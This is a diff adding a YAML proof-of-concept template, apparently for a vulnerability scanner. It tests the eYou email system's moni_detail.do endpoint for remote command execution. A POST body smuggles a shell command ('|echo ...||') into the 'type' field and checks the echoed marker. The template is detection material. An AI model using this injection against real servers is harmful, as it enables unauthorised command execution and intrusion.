@@ -1,0 +1,16 @@
+name: poc-yaml-eyou
+transport: http
+set:
+    f1: md5(string(randomInt(1000, 2000)))
+rules:
+    r0:
+        request:
+            method: POST
+            path: /webadm/?q=moni_detail.do&action=gragh
+            body: "type=\'|echo {{f1}}||\'"
+        expression: response.status == 200 && response.body.bcontains(bytes(f1))
+expression: r0() 
+detail:
+    author: Old10vEly
+    links:
+        - http://wiki.peiqi.tech/wiki/webapp/%E4%BA%BF%E9%82%AE/%E4%BA%BF%E9%82%AE%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E7%B3%BB%E7%BB%9F%20moni_detail.do%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
